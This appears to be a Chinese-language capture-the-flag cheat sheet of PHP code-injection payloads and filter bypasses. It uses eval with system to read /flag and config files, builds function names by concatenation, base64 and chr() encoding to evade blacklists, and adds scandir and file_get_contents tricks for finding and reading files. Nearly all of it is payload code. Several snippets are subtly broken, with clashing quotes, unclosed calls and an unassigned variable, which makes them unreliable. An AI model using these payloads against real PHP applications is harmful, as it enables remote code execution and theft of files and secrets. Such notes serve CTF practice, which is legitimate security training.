在线php运行：<https://www.jyshare.com/compile/1/>



## **php常见特殊函数和绕过**
highlight_file("config.php");        //文件内容包含高亮。
eval('system('cat /flag'); ');         //会将字符串当作PHP代码执行，注意分号。
eval('system('cat /flag')?> ');    // 分号可以用?>替换。 且后面代码也会正常执行。
eval("$x='sys';  $y='tem';  $z=$x.$y;  $z('cat config.php');" );         //绕过过滤。
eval('base64_decode("c3lzdGVt");$b=base64_decode("Y2F0IGNvbmZpZy5waHA=");$a($b);');        //base64编码绕过。


^
print_r(file_get_contents(/flagg')); //打印获取文件的内容
var_dump(scandir(/);  //查看根目录
var_dump(scandir(chr(47))); //查看根目录

var_dump(file_get_contents(/flagg')); //打印获取文件的内容。file_get_content()也可以读取php://filter伪协议。
var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)));  //绕过打印flag


^

命令执行找flag文件：find / -name flag*
递归搜当前目录下内容：grep -r "flag{" .

php内的"\"在做代码执行的时候，会识别特殊字符串，绕过黑名单。
如\system